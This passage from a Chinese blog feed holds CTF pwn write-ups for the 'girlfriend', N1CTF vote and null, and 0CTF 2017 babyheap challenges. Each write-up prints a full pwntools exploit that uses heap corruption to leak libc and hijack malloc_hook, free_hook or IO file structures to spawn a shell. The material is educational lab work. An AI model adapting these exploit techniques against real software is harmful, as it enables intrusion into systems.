0;&#125; 代码中主线程和子线程都分别调用了print_fs_base()函数用于打印fs段基地址，运行程序看一下： fs base addr: 0x7f36757c8700start, g[0x7f36757c86fc] : 0fs base addr: 0x7f3675fcb700main, g[0x7f3675fcb6fc] : 100 可以看到： 子线程fs段基地址为0x7f36757c8700，g的地址为0x7f36757c86fc，它正好是基地址 - 4 主线程fs段基地址为0x7f3675fcb700，g的地址为0x7f3675fcb6fc，它也是基地址 - 4 由此可以得出，gcc编译器（其实还有线程库以及内核的支持）使用了CPU的fs段寄存器来实现线程本地存储，不同的线程中fs段基地址是不一样的，这样看似同一个全局变量但在不同线程中却拥有不同的内存地址，实现了线程私有的全局变量。 了解了这么多，我们可以开始着手开始解决girlfriend了 ps：出了girlfriend，还是没有girlfriend（&gt; _&lt;）。。。。 girlfriend:题目：girlfriend 程序分析：emmm，首先看到这道题和平常的套路菜单题不同，五个选项从名字并看不出什么端倪。。。。还是静下心一个一个慢慢分析吧orz。。。。 begin函数:我们可以看到在begin函数中，每次选项之后都会经过一个if语句来判断是否创建线程，创建的线程数所依据的invite_num现在还未知，创建以后，主线程会申请一个0x30的chunk，每个线程中也会创建0x30的chunk，且他们都保存在girlfriend_chat_list中，然后我们发现主线程会sleep一段时间，这个时间似乎可以由我们掌控（猜一下啦），这个时间可以用来让我们选择是将主线程的堆指针放到girfriend_chat_list的最后（设置的足够长，等所有线程malloc完主线程再malloc），还是第一位（设置为0），这一点在之后是很关键的一步。 personal_info函数:当name_status大于0时（在begin里实现这个），将会启用一个格式化字符串漏洞（前提是name可控的话）。 chat函数:让我们在girl_chat_list中选一个chunk然后可以溢出8字节，不过这8字节的位置在chunk的地址的0x30之后。看似似乎并没有什么作用。。。继续看吧 make_appointment函数：在这个函数中，我们可以控制invite_num，也就是线程数，和主线程的sleep的时间，并开启一个begin函数中的if语句中的状态变量。而且还可以输入name，不过。。。不过。只有四个字节orz（%k&amp;p，k&lt;=9），这就很操蛋，因为64位的格式化字符串实际上从6才开始，到9就结束的话可以泄露的范围很小。。。 let_go函数：let_go函数里有两个状态，一个第一次调用时先定一个闹钟，这个闹钟就是每个线程的sleep时间，之后再调用的话就会又有三个分选项（第三个算是隐藏选项，其中有一个off-by-one漏洞，但是其需要通过一个if条件语句才能开启。），其余两个功能就是new与delete的常规操作，不过在new里，我们发现一个不起眼的地方，就是watch movie这里，感觉这里出的莫名其妙。。。干啥用的？？后来发现是一个任意地址溢出漏洞，不过只能加一次，且只能加一。先放这里吧。 这道题信息量比较大，题目先后关联比较紧密，如果没有把程序完全看懂的话很难做出来，甚至连思路都没有。 我们来仔细分析一下： 首先我们可以先调用make_appointment和let_go使name_status变为1，利用格式化字符串泄露信息，但是调试发现只能泄露出程序基址，无法泄露libc。 想利用off-by-one但是if条件过不了，寻找能使if条件中变量值改变的函数，发现在start_routine中，使 (signed int)__readfsdword(0xFFFFFFFC) &gt; 1即可，由题目之前介绍的知识可知，这个位置方法是线程私有变量，所以只要有一个线程实现这个使key等于1就行了，但是调试发现这个位置始终为1，且没有函数能让其变化。。思路陷入死胡同。。。 怎样泄露libc也没有头绪。那个溢出似乎能派上用场，但其只能溢出线程和主线程的topchunk的前八个字节啊。。。 movie的不起眼小功能还不知道怎么用。。。。 这个时候我们就需要上网查阅资料。。。终于想到可以利用arena的复用，申请九个thread，然后最后一个线程和主线程共用一个arena，然后用chat函数溢出最后一个线程，更改主线程chunk中的name指针为puts函数地址，泄露libc！！！！ 然后然后利用watch movie的任意地址加一，使某一个线程的FS：0xFFFFFFC加一变为2，通过start_routine的if检查，使key变为1，开启off-by-one，最后实现overlapping，然后为所欲为，拿到shell。 exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122#coding:utf-8from pwn import *context(os='linux',arch='amd64')#context.log_level = 'debug'context.terminal = ['terminator','-x','sh','-c']p = process('./girlfriend')#p = remote('47.92.28.22',30499)P = ELF('./girlfriend')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def make(name): p.recvuntil('&gt;&gt; \n') p.sendline('3') p.recvuntil('invite?\n') p.sendline('9') p.recvuntil('name: ') p.send(name) p.recvuntil('When: ') p.sendline('4.0')def let_go1(): p.recvuntil('&gt;&gt; \n') p.sendline('5') p.recvuntil('home?\n') p.sendline('3.0') def let_go2(choice,size,to,content,flag = 0): p.recvuntil('&gt;&gt; \n') p.sendline('5') p.recvuntil('home\n') p.sendline(str(choice)) p.recvuntil('have\n') p.sendline(str(size)) if flag == 0: p.recvuntil('movie: ') p.sendline(str(to)) p.recvuntil('something: ') p.send(content)def delete(index): p.recvuntil('&gt;&gt; \n') p.sendline('5') p.recvuntil('home\n') p.sendline('2') p.recvuntil('byebye:') p.sendline(str(index))def chat(index,size,content): p.recvuntil('&gt;&gt; \n') p.sendline('2') p.recvuntil('girl: ') p.sendline(str(index)) p.recvuntil('size: ') p.sendline(str(size)) p.recvuntil('Content: ') p.send(content)#----------------------first.leak program base addr---------------make('%9$p')let_go1()p.recvuntil('&gt;&gt; \n')p.sendline('1')base_addr = int(p.recv(14),16)-0x1ea5log.success('base_addr = '+hex(base_addr))#----------------------first success------------------------------#---------------second.overflow and leak libc----------------chat(8,0x30,'\x00'*0x40+p64(base_addr+P.got['puts']))#gdb.attach(p)p.recvuntil('&gt;&gt; \n')p.sendline('1')libcbase = u64(p.recv(6).ljust(8,'\x00'))-libc.sym['puts']log.success('libcbase = '+hex(libcbase))#--------------second success-------------------------------#--------------third.add key-----------------------------#gdb.attach(p,'b *base_addr+0x1813')to = (libcbase-(0x7ffff77f0000-0x7ffff77ef6fc) - (base_addr+0x6760))/4let_go2(1,0x10,to,'\x44'*0x10)sleep(1) #不要忘记!!!!#-------------third success------------------------------let_go2(1,0xf0,0,'\x44'*0xf0,1)let_go2(1,0xf0,0,'\x44'*0xf0,1) #2let_go2(1,0x60,0,'\x44'*0x60,1) #3let_go2(1,0x60,0,'\x44'*0x60,1) #4let_go2(1,0xf0,0,'\x44'*0xf0,1) #5let_go2(1,0xa20,0,'\x44'*0xa20,1) #6p.recvuntil('&gt;&gt; \n')p.sendline('5')p.recvuntil('home\n')p.sendline('3')p.recvuntil('Index: ')p.sendline('4')p.recvuntil('size: ')p.sendline(str(0x60))p.recvuntil('Content: ')payload = '\x44'*0x58+p64(0x1e0)+'\x00'p.send(payload)delete(3)delete(2)delete(5)let_go2(1,0xe0,0,'\x44'*0xe0,1) #7payload = libcbase+(0x7f35b1799b20-0x7f35b13d5000)-0x33let_go2(1,0x20,0,p64(0x71)+p64(payload)+p64(0)*2,1) #8one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]let_go2(1,0x60,0,'\x44'*0x60,1) #9let_go2(1,0x60,0,'\x44'*11+p64(libcbase+one_gadget[2]),1) #10delete(10)p.interactive() 反思与需要注意的细节：在设置主线程和分线程的sleep时间时，我们要一定要注意了，main_thread的sleep时间一定要充足，不要太短，两三秒差不多，不要设0.5秒这种。。因为太短的话不一定能使所有的thread的malloc申请完，不一定能使第九个thread的chunk位于main_thread的chunk上方，也就无法泄露。 线程的sleep时间比main_therad的sleep时间长一秒钟即可，这一秒种是让主线程有充足的时间利用watch movie功能的任意地址加一漏洞使某一个线程的fs:0xffffffc加一，在exp中也最好也等待1秒钟，看到程序输出Now you have a girlfriend再继续往下进行，防止数据错乱。 2019_RCTF_manynotes:题目：manynotes 2018_N1CTF_vote:题目：vote和null 题目分析：由题目放进ida里，观察程序我们可发现这是一个投票的程序，然后在堆里会建一个竞选选手结构体，装有count（所获票数），time（当前时间）和name（我们自己可控），最多可建16个，所以我们可以大致猜到，这题的count和time是用来干扰我们控制伪造chunk的fd和bk指针用的，然后我们若选择投票功能，主线程会创建一个子线程，然后在子线程里会sleep三秒钟，之后会在投票池投最新的竞选选手一票。（这里有个条件竞争的漏洞，或者说需要避免的地方，就是如果先投了一个选手，在三秒内再投了另外一个选手，前一个线程中的指针会被第二个线程篡改，就等于给第二个选手投了两票，我们需要避免这一点），然后在cancel功能里有一个uaf漏洞（保证这个uaf漏洞可以trigger的条件是要避免出现前面所说的条件竞争，且不能给我们要cancel的选手投票。） 利用这个uaf可以直接泄露libcbase，然后我们发现vote功能可以给已经free的chunk投票，且投票不限次数，所以我们想到可以用对已经放入fastbin的chunk进行多次vote来modify其fd指针（常规的fastbin_attack），使其指向我们伪造的一个fastbin_chunk（可以用name来构造）。然后劫持到main_arena-0x33，然后改malloc_hook为one_gadget，后利用malloc_printerr触发，getshell!!!!!! exp如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788#coding:utf-8from pwn import *debug=0elf = ELF('./4')if debug: p= process('./4') context.log_level = 'debug' context.terminal = ['terminator','-x','sh','-c'] libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')else: p = remote("47.92.28.22",30529) libc = ELF('./libc.so.6')def add(size,name): p.recvuntil('Action:') p.sendline('0') p.recvuntil('size') p.sendline(str(size)) p.recvuntil('name:') p.send(name)def show(index): p.recvuntil('Action:') p.sendline('1') p.recvuntil('index') p.sendline(str(index))def vote(index): p.recvuntil('Action:') p.sendline('2') p.recvuntil('index') p.sendline(str(index)) def cancel(index): p.recvuntil('Action:') p.sendline('4') p.recvuntil('index') p.sendline(str(index)) name = '\x44'*0x80add(0x80,name) #0add(0x80,'\x44'*0x80) #1cancel(0)show(0)p.recvuntil('count: ')libcbase = int(p.recvuntil('\n'),10) - (0x7f68b6a05b78-0x7f68b6641000)log.success('libcbase = '+hex(libcbase))add(0x80,'\x44'*0x80) #2add(0x50,'\x44'*0x50) #3name = p64(0) + p64(0x71) + p64(libcbase+0x7f0e8c25eb20-0x7f0e8be9a000-0x33) add(0x50,name+'\n') #4cancel(4)cancel(3)for i in range(0x20): vote(3)sleep(4)'''0x45216 execve("/bin/sh", rsp+0x30, environ)constraints: rax == NULL0x4526a execve("/bin/sh", rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xf02a4 execve("/bin/sh", rsp+0x50, environ)constraints: [rsp+0x50] == NULL0xf1147 execve("/bin/sh", rsp+0x70, environ)constraints: [rsp+0x70] == NULL'''one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]add(0x50,'\x44'*0x50)add(0x50,'\x44'*0x50)add(0x50,'\x00'*3+p64(libcbase+one_gadget[2])+'\n')cancel(7)#gdb.attach(p)p.interactive() 2018_N1CTF_null:程序分析与漏洞挖掘：这道题又触及到了我的一块知识盲区，就是threads的malloc_state和heap_info结构体的内容以及他们在内存中的地址，和一个read()函数的溢出漏洞。 程序逻辑很简单，就是输入一段密码然后程序会创建一个线程。 然后在线程中可以进行不限次数和size最大为0x4000的malloc，并在最后一个malloc里可以填充数据，在这里我们仔细观察的话可以发现一个溢出漏洞，第一次不read满的话，第二次还能继续read。 调试发现，线程的chunk会申请在线程的堆块区，然后再这个堆块区的首位先是heap_info结构体（一个堆块区一个，每个堆块区的heap_info结构体之间用链表相连，且他们都保存了malloc_state的地址），然后紧接着是malloc_state结构体（一个线程只有一个），之后会一直往后申请，继续调试发现当我们把当前堆块区填满时，操作系统会在当前堆块区地址之前（和之前那个不相邻）再次分配一块堆块区，且大小为（每一块大小为0x4000000），这时候我们继续申请消耗堆块区空间，当这一块堆空间又被消耗完时，操作系统又会在其后分配一块新的堆空间，我们调试发现第三块的尾部就是初始堆块区的头部。 当继续消耗堆空间使第三块快耗尽时，我们利用溢出进行fastbinattack攻击（因为第一个堆块区的首部是malloc_state结构体），将0x70size的chunk劫持到bss段上（利用stdout流的首字节为0x7f），然后输入’/bin/sh\x00’字符串，并且将函数指针改为system的地址，然后当程序调用函数指针时就会打开shell。 exp如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#coding:utf-8from pwn import *context(os='linux',arch='amd64')#context.terminal = ['terminator','-x','sh','-c']context.log_level = 'debug' p = process('./null_')p.recvuntil('password: \n')p.send("i'm ready for challenge\n")for i in range(12): p.recvuntil('Action: ') p.sendline('1') p.recvuntil('Size: ') p.sendline(str(0x4000)) p.recvuntil('blocks: ') p.sendline('1000') p.recvuntil('(0/1): ') p.sendline('1') p.recvuntil('Input: ') payload = '\x44'*0x4000 p.send(payload)p.recvuntil('Action: ')p.sendline('1')p.recvuntil('Size: ')p.sendline(str(0x4000))p.recvuntil('blocks: ')p.sendline('262')p.recvuntil('(0/1): ')p.sendline('1')p.recvuntil('Input: ')payload = '\x44'*0x3000p.send(payload)payload = '\x44'*0x1020 + p64(0)*10 + p64(0x60201d)p.send(payload)p.recvuntil('Action: ')p.sendline('1')p.recvuntil('Size: ')p.sendline(str(0x60))p.recvuntil('blocks: ')p.sendline('0')p.recvuntil('(0/1): ')p.sendline('1')p.recvuntil('Input: ')payload = '/bin/sh\x00' + '\x00'*3 payload+= p64(0x400978) #addr of systempayload+= p64(0)*(0x60/8)p.send(payload)p.interactive() PS：我发现似乎线程与程序交互的数据只能配了context.log_level = ‘debug’，才能看得出来，打开shell以后也必须这样，去掉context.log_level = ‘debug’，程序的交互将不可见。 一些关于线程的指令:arenainfo :打印所有线程的arena信息。在pwndbg中可以使用。 info threads:打印当前程序中所有线程 thread id:切换线程，id看info threads中所标的。 参考链接：free_list的简介 pthread_join及linux线程 https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/ 关于TLS]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>ctf_writeups</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[5种解法解2017_0ctf_babyheap]]></title>
    <url>%2F2019%2F06%2F11%2F5%E7%A7%8D%E8%A7%A3%E6%B3%95%E8%A7%A32017_0ctf_babyheap%2F</url>
    <content type="text"><![CDATA[(这其实这是我的网安实践作业。。。后来觉得放上来凑个数吧。。。orz 题目放在我的github上：2017_0CTF_babyheap 第一次解：预览题目：可以看到文件为64位，保护全开，给了libc（版本为2.24），标准的堆题。。。看到full relro一般为改hook为one_gadget。放进ida里进一步分析： 主要功能分析及漏洞寻找：可以看到程序开始时先选了一段随机不可控的地址来储存chunk指针列表的基地址（base_ptr）。紧接着就进入了死循环，打印菜单，输入选项，运行函数。我们来逐个分析功能： 在allocate()功能中，我们发现申请的chunk的大小可以由我们自己决定（小于0x1000），是可控的，且heap结构体中会储存我们申请到的chunk的大小。此外，我们申请堆块时用的是 calloc() 而不是malloc()这意味着堆块的数据开始时要被初始化为0，这一点需要注意。 fill()函数就是向我们申请过的chunk里填数据，不过有一个很明显的任意溢出更改漏洞。 free()就是将chunk指针free()，没有uaf漏洞。 print()函数就是打印对应下标的chunk的content，不过打印的内容是根据我们在allocate()时输入的size来决定的。 思考如何利用漏洞：首先我们的最终目标定为：将malloc_hook改为one_gadget，现阶段，我们只能借助于程序自身的fill()功能来进行写，而fill()功能又需要一个堆指针，所以我们的目标转化为如何使堆指针分配到malloc_hook附近，我们运用fastbinattack功能与overlapping结合的方法来实现。 leak:因为我们要确定malloc_hook的地址与one_gadget的地址，所以必须泄露出libc才能继续往下进行。 我们可以利用程序的print()功能来实现泄露libc地址，先申请4个chunk（chunk2大小为smallchunk），然后通过0来改写1的size，然后通过标准的overlapping方法，先free()再malloc()，然后chunk2现在在1的里面，(这里要注意，因为是calloc，所以再次申请chunk1的时候，chunk2的chunk_header会被清零，需要fill()重新布置一下)，然后free chunk2，将其放入unsortedbin中，然后通过chunk1的print()打印出chunk2的fd指针，成功泄露libc。 控制程序执行流:之后我们就可以先把chunk2（大小我们申请为0x60）放进fastbin里，然后通过chunk1改其fd指针为&amp;main_arena-0x33，然后在申请两次即可，然后再通过改chunk4的内容来改malloc_hook，再申请则会触发one_gadget。 exp如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091#coding:utf-8from pwn import *context(os='linux',arch='amd64')#context.log_level='debug'p=process('./babyheap')libc=ELF('./libc.so.6')def allocate(length): p.recvuntil('Command: ') p.sendline('1') p.recvuntil(': ') p.sendline(str(length))def fill(ID,length,payload): p.recvuntil('Command: ') p.sendline('2') p.recvuntil('Index: ') p.sendline(str(ID)) p.recvuntil('Size: ') p.sendline(str(length)) p.recvuntil('Content: ') p.send(payload)def free(ID): p.recvuntil('Command: ') p.sendline('3') p.recvuntil('Index: ') p.sendline(str(ID))def dump(ID): p.recvuntil('Command: ') p.sendline('4') p.recvuntil('Index: ') p.sendline(str(ID))offset = 0x3c4b20#---------------1.leak--------------------#-------------overlapping start-----------allocate(0x20) #index 0allocate(0x20) #index 1allocate(0x100) #index 2allocate(0x20) #index 3 隔离index 2 防止其被topchunk合并#---------------change--------------------payload = 'a'*0x20+p64(0)+p64(0x141)fill(0,len(payload),payload)#gdb.attach(p)#--------------free and malloc------------free(1)allocate(0x130)payload = '\x00'*0x20+p64(0)+p64(0x111) #因为calloc()会清空index 1fill(1,len(payload),payload)#--------------overlapping down-----------free(2)#gdb.attach(p)dump(1)p.recvuntil('Content: \n')main_arena_addr = u64(p.recv()[48:48+6].ljust(8,'\x00')) - 88libcbase = main_arena_addr - offsetone_gadget = 0x4526a #0x4526a 0xf02a4 0xf1147one_gadget_addr = libcbase + one_gadgetlog.success('libcbase = ' + hex(libcbase))#gdb.attach(p)#-------------leak down-------------------#---------------2.change------------------p.sendline('1') #index 2p.recvuntil(': ')p.sendline(str(96))#gdb.attach(p)free(2)#gdb.attach(p)fake_chunk_addr = main_arena_addr - 0x33payload = 'a'*0x20+p64(0)+p64(0x71)+p64(fake_chunk_addr)fill(1,len(payload),payload)#gdb.attach(p)allocate(0x60) #index 2#gdb.attach(p)allocate(0x60) #index 4payload = 'a'*0x13 + p64(one_gadget_addr)fill(4,len(payload),payload)allocate(0x20)p.interactive() 反思，拓展与多解：回过头来看这一题，就是一道中规中矩的堆题，堆的理论知识扎实并且调试能力不错的人解出应该只是时间问题。又因为这道题漏洞太多，题目所做的限制（申请的堆块大小不限制，chunk的所在范围不限制，任意溢出漏洞，有upgrade功能，有输出打印功能等等）也太少，正好借这次作业的机会来复习一下之前学过的一些堆利用的基础姿势。 第二种解_realloc_hook微调栈环境：说是第二种解，其实只是在第一种基础解上略加改动，用了一个小技巧而已，在main_arena上方0x20处是realloc_hook和malloc_hook，我们第一种解法是将malloc_hook直接改为one_gadget，这种解法其实有很大的运气成分，因为one_gadget的成功是需要条件的，需要[rsp+0xxx] == NULL 时才会成功有时候我们不能保证这个条件成立，这时就有一个技巧叫做realloc_hook微调，利用realloc_hook来调整栈环境，因为我们将chunk直接伪造在&amp;main_arena-0x33处，所以我们可以把realloc_hook和malloc_hook全都控制，realloc函数在函数起始会检查realloc_hook的值是否为0，不为0则跳转至realloc_hook指向地址，所以我们把realloc_hook设为one_gadget的地址，将malloc_hook设置为realloc函数开头某一push寄存器处。push和pop的次数是一致的，若push次数减少则会压低堆栈，改变栈环境。这时one_gadget就会可以使用。具体要压低栈多少要根据环境决定，这里我们可以进行小于48字节内或72字节的堆栈调整。 exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475#coding:utf-8from pwn import *context(os='linux',arch='amd64',terminal = ['terminator','-x','sh','-c'])#context.log_level='debug'p = process('./babyheap')P = ELF('./babyheap')libc = ELF('./libc.so.6')def allocate(length): p.recvuntil('Command: ') p.sendline('1') p.recvuntil(': ') p.sendline(str(length))def fill(ID,length,payload): p.recvuntil('Command: ') p.sendline('2') p.recvuntil('Index: ') p.sendline(str(ID)) p.recvuntil('Size: ') p.sendline(str(length)) p.recvuntil('Content: ') p.send(payload)def delete(ID): p.recvuntil('Command: ') p.sendline('3') p.recvuntil('Index: ') p.sendline(str(ID))def dump(ID): p.recvuntil('Command: ') p.sendline('4') p.recvuntil('Index: ') p.sendline(str(ID))allocate(0x60) #0allocate(0x60) #1allocate(0x60) #2allocate(0x60) #3allocate(0x60) #4allocate(0x60) #5 payload='a'*96+p64(0x00)+chr(0xe1)fill(2,len(payload),payload)delete(3)allocate(0x60)#3 p.sendline('4')p.recvuntil('Index:')p.sendline('4')p.recvuntil('Content: \n')libcbase = u64(p.recv(6).ljust(8,'\x00'))-(0x7f88fe7e9b78- 0x7f88fe425000)log.success('libcbase = '+hex(libcbase)) #gdb.attach(p)sys = libcbase + libc.symbols['system']re_hook = libcbase + libc.symbols['__realloc_hook']mac_hook = libcbase + libc.symbols['__malloc_hook']realloc = libcbase + libc.symbols['__libc_realloc']allocate(0x60)#6 delete(4)payload=p64(mac_hook-0x23)fill(6,len(payload),payload)allocate(0x60)#4allocate(0x60)#7payload='a'*0xb + p64(libcbase+0x4526a) + p64(realloc+8)fill(7,len(payload),payload)allocate(0x60)#gdb.attach(p)p.interactive() 第三种解_将topchunk迁移到free_hook上方：同malloc_hook类似，在调用free函数时会先检验free_hook的值。但是free_hook上方都是0字节。不能直接通过fastbin_attack进行攻击，可以先通过fastbinattack修改topchunk_addr为&amp;__free_hook-0xb58，之后申请内存至free_hook修改为system地址。fastbin数组在top chunk指针上方。可以通过free fastbin chunk修改fastbin数组的值使的fastbin attack可以实现。 存在限制要求堆的地址以0x56开头(原因看最后一种解法largebinattack。) exp如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788#coding:utf-8from pwn import *context(os='linux',arch='amd64',terminal = ['terminator','-x','sh','-c'])#context.log_level='debug'p = process('./babyheap')P = ELF('./babyheap')libc = ELF('./libc.so.6')def allocate(length): p.recvuntil('Command: ') p.sendline('1') p.recvuntil(': ') p.sendline(str(length))def fill(ID,length,payload): p.recvuntil('Command: ') p.sendline('2') p.recvuntil('Index: ') p.sendline(str(ID)) p.recvuntil('Size: ') p.sendline(str(length)) p.recvuntil('Content: ') p.send(payload)def delete(ID): p.recvuntil('Command: ') p.sendline('3') p.recvuntil('Index: ') p.sendline(str(ID))def dump(ID): p.recvuntil('Command: ') p.sendline('4') p.recvuntil('Index: ') p.sendline(str(ID))while 1: try: p = process('./babyheap') allocate(0x40) #0 allocate(0x40) #1 allocate(0x40) #2 allocate(0x40) #3 allocate(0x40) #4 allocate(0x40) #5 allocate(0x60) allocate(0x60) delete(6) payload = 'a'*64+p64(0x00)+chr(0xa1) payl = '/bin/sh'+chr(0) fill(0,len(payl),payl) fill(2,len(payload),payload) delete(3) allocate(0x40)#3 p.sendline('4') p.recvuntil('Index:') p.sendline('4') p.recvuntil('Content: \n') libcbase = u64(p.recv(6).ljust(8,'\x00')) - (0x7ff5f5385b78-0x7ff5f4fc1000) free_hook=libcbase + libc.symbols['__free_hook'] log.success('libcbase = '+hex(libcbase)) allocate(0x40) delete(6) payload = p64(libcbase+(0x7f8655ab2b4d-0x7f86556ee000)) fill(4,len(payload),payload) #gdb.attach(p) allocate(0x40) allocate(0x40) #8 payload = 'a'*0x1b+p64(free_hook-0xb58) fill(8,len(payload),payload) #gdb.attach(p) for i in range(0,6): allocate(0x200) system = libcbase + libc.symbols['system'] payload = chr(0)*0xf8+p64(system) fill(14,len(payload),payload) delete(0) break except EOFError: p.close()p.interactive() 第四种解_largebin_attack构造fakechunk：因为申请的chunk大小不受限制，所以largebin_attack当然在我们的考虑范围之内，largebinattack的主要效果为在任意地址写入堆地址，实际运用就是用堆地址的开头0x55/0x56来进行chunk的size的错位构造，所以我们就可以在free_hook的上方写入堆地址，然后利用fakechunk来改写free_hook为system，之后运行system(‘/bin/sh\x00’)获取shell。但是需要注意的是并不是一定能成功，因为当size为0x55(1010101)时被free会报错，而0x56(1010110)却不会,因为第二个bit位为0时会被认为是mmap出来的地址从而free这块地址会报错，而为1时则不会，所以加个循环就OK了。 关于largebin_attack的技术在赛题中出现较少，可参考以下链接学习： veritas师傅的blog ctf-wiki 从2019西湖论剑的一道题来看largebinattack exp如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495#coding:utf-8from pwn import *context(os='linux',arch='amd64')#context.log_level='debug'p=process('./babyheap')#,env=&#123;'LD_PRELOAD':'./libc.so.6'&#125;)libc=ELF('./libc.so.6')def new(length): p.recvuntil('Command: ') p.sendline('1') p.recvuntil(': ') p.sendline(str(length))def upgrade(ID,length,payload): p.recvuntil('Command: ') p.sendline('2') p.recvuntil('Index: ') p.sendline(str(ID)) p.recvuntil('Size: ') p.sendline(str(length)) p.recvuntil('Content: ') p.send(payload)def delete(ID): p.recvuntil('Command: ') p.sendline('3') p.recvuntil('Index: ') p.sendline(str(ID))def view(ID): p.recvuntil('Command: ') p.sendline('4') p.recvuntil('Index: ') p.sendline(str(ID))while 1: try: p = process('./babyheap') new(0x90) #0 new(0x90) #1 new(0x90) #2 new(0x90) #3 payload = '\x00'*0x90 + p64(0) + p64(0x141) upgrade(0,len(payload),payload) delete(1) new(0x90) #1 view(2) p.readuntil('Content: \n') libcbase = u64(p.recv(6).ljust(8,'\x00'))-(0x7fcbd010eb78- 0x7fcbcfd4a000 ) free_hook = libcbase + libc.symbols['__free_hook'] log.success('libcbase = '+hex(libcbase)) log.success('free_hook = '+hex(free_hook)) new(0x90) #4 p.sendline('3') p.recvuntil('Index: ') p.sendline(str(3)) delete(2) delete(1) delete(0) new(0x20) #0 new(0x4d0) #1 new(0x20) #2 new(0x4e0) #3 new(0x20) #5 delete(1) new(0x500) #1 payload = '/bin/sh\x00' + p64(0)*3 + p64(0) + p64(0x4e1) + p64(0) + p64(free_hook-0x20+8) + p64(0) + p64(free_hook-0x40+3) upgrade(0,len(payload),payload) delete(3) payload = p64(0)*4 + p64(0) + p64(0x4f1) + p64(0) + p64(free_hook-0x20) upgrade(2,len(payload),payload) new(0x40) #3 system_addr = libcbase + libc.sym['system'] payload = '\x00'*0x10 + p64(system_addr) upgrade(3,len(payload),payload) delete(0) break except EOFError: p.close()#gdb.attach(p)p.interactive() 第五种解_利用IO_str_jump来运行system(‘/bin/sh\x00’)：有任意溢出这种大漏洞存在，所以可以溢出到topchunk的内容，IO_FIFE的利用方法就很容易被想到，因为libc2.24较libc2.23对vtable_ptr做了范围检查，我们不能直接控制他，house of orange技术将不再适用，但当然有新的技术衍生出来，就是利用IO_str_jump。具体原理参考以下链接： 新手向——IO_file全流程浅析 exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596#coding:utf-8from pwn import *context(os='linux',arch='amd64')#context.log_level='debug'p=process('./babyheap',env=&#123;'LD_PRELOAD':'./libc.so.6'&#125;)libc=ELF('./libc.so.6')def allocate(length): p.recvuntil('Command: ') p.sendline('1') p.recvuntil(': ') p.sendline(str(length))def fill(ID,length,payload): p.recvuntil('Command: ') p.sendline('2') p.recvuntil('Index: ') p.sendline(str(ID)) p.recvuntil('Size: ') p.sendline(str(length)) p.recvuntil('Content: ') p.send(payload)def free(ID): p.recvuntil('Command: ') p.sendline('3') p.recvuntil('Index: ') p.sendline(str(ID))def dump(ID): p.recvuntil('Command: ') p.sendline('4') p.recvuntil('Index: ') p.sendline(str(ID))offset = 0x3c4b20#---------------1.leak--------------------#-------------overlapping start-----------allocate(0x20) #index 0allocate(0x20) #index 1allocate(0x100) #index 2allocate(0x20) #index 3 隔离index 2 防止其被topchunk合并#---------------change--------------------payload = 'a'*0x20+p64(0)+p64(0x141)fill(0,len(payload),payload)#gdb.attach(p)#--------------free and malloc------------free(1)allocate(0x130)payload = '\x00'*0x20+p64(0)+p64(0x111) #因为calloc()会清空index 1fill(1,len(payload),payload)#--------------overlapping down-----------free(2)#gdb.attach(p)dump(1)p.recvuntil('Content: \n')main_arena_addr = u64(p.recv()[48:48+6].ljust(8,'\x00')) - 88libcbase = main_arena_addr - offsetone_gadget = 0x4526a #0x4526a 0xf02a4 0xf1147one_gadget_addr = libcbase + one_gadgetlog.success('libcbase = ' + hex(libcbase))#gdb.attach(p)#-------------leak down-------------------io_str_jumps = libcbase + (0x7fc707c647a0 - 0x7fc7078a1000)io_list_all = libcbase + (0x7f82cc242520-0x7f82cbe7d000 )system_addr = libcbase + libc.sym['system']sh_addr = libcbase + libc.search('/bin/sh\x00').next() log.success('system_addr = '+hex(system_addr))log.success('io_str_jumps = '+hex(io_str_jumps))log.success('io_list_all = '+hex(io_list_all))payload = p64(0)*4payload+= p64(0)+p64(0x61)payload+= p64(0)+p64(io_list_all-0x10)payload+= p64(0)+p64(1)payload+= p64(0)+p64(sh_addr)payload = payload.ljust(0xe8+0x10,'\x00')payload+= p64(io_str_jumps-8) + p64(0) + p64(system_addr)p.sendline('2')p.recvuntil('Index: ')p.sendline(str(1))p.recvuntil('Size: ')p.sendline(str(len(payload)))p.recvuntil('Content: ')p.send(payload)p.recvuntil('Command: ')p.sendline('1')p.recvuntil(': ')p.sendline(str(0x10))#gdb.attach(p)p.interactive() 结语：以上就是所有的五种解法，说是解法，其实只是一些小技巧而已，这道题漏洞点较多，所以可以运用的方法比较多，正常比赛的情况下pwn题顶多也就2种解法，非预期解很难实现。以上这些技巧都是堆题中经常碰到的，需要熟练掌握才能在比赛中游刃有余地分析程序的漏洞，而不是卡在漏洞利用上。。 参考链接：看学的师傅]]></content>
      <categories>
        <category>ctf-writeups</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[2017/2018/2019_0ctf_babyheap_writeups]]></title>
    <url>%2F2019%2F06%2F09%2F2017-2018-2019-0ctf-babyheap-writeups%2F</url>
